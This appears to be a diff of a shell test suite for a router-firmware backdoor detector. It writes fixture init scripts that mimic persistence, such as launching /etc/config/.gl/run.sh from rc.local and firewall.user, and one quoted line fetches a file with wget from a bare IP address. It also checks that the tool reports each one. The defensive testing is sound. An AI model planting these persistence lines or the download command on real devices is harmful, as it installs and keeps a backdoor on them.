@@ -439,12 +439,14 @@ printf 'cat > /tmp/a.sh <<E\nwget -q -O /tmp/n \\\n http://65.20.71.131:8000/ni.
 printf 'x=$((1<<2))\nstart-stop-daemon -S -b \\\n -x /etc/config/.gl/gl-helper\n' >"$U/etc/init.d/q-shift"
 printf 'x=${y%%)#*}; /etc/config/.gl/run.sh &\n' >"$U/etc/init.d/q-sub"
 printf 'echo \\;#x; /etc/config/.gl/run.sh &\n' >"$U/etc/init.d/q-esc"
-printf 'echo "/etc/config/.gl/ found" >> /etc/profile.d/note.sh\n' >"$U/etc/init.d/q-note"
+printf 'echo "/etc/config/.gl/ found" >> /etc/profile.d/note.sh\necho "gl-helper: checked" >> /etc/profile.d/note.sh\n' >"$U/etc/init.d/q-note"
+printf 'cd /etc && echo "/etc/config/.gl/run.sh &" >> rc.local\n' >"$U/etc/init.d/q-rel"
+printf 'echo "/etc/config/.gl/run.sh &" >> /etc/firewall.user\n' >"$U/etc/init.d/q-fw"
 mnt "$D" "$OWL"
 run "$D" "$OWL" --check >"$D/check.txt"; rc=$?
 expect "here-document run later, sh -c and echo over lines, an open quote, watch, a long string, a backdoor name: each IOC persist-ref" '[ $rc = 1 ] && ( for n in hd shc cron open watch awk guard echo nest hash dollar var; do grep -q "IOC  *persist-ref  */etc/init.d/q-$n" "$D/check.txt" || exit 1; done )'
-expect "a \\ in a here-document or after a shift, a # sh reads as no comment: each IOC persist-ref" '( for n in hdcont shift sub esc; do grep -q "IOC  *persist-ref  */etc/init.d/q-$n" "$D/check.txt" || exit 1; done )'
-expect "a note written to a profile script, starting with a directory, runs nothing: no IOC" '! grep -q "IOC  *[a-z-]*  */etc/init.d/q-note" "$D/check.txt"'
+expect "a \\ in a here-document or after a shift, a # sh reads as no comment, echo into rc.local after cd, into firewall.user: each IOC persist-ref" '( for n in hdcont shift sub esc rel fw; do grep -q "IOC  *persist-ref  */etc/init.d/q-$n" "$D/check.txt" || exit 1; done )'
+expect "a note written to a profile script, starting with a directory or a word with a colon, runs nothing: no IOC" '! grep -q "IOC  *[a-z-]*  */etc/init.d/q-note" "$D/check.txt"'
 umount "$D/m"
 
 echo "=== owners who block the older backdoor's servers their own way (review of 2.54)"
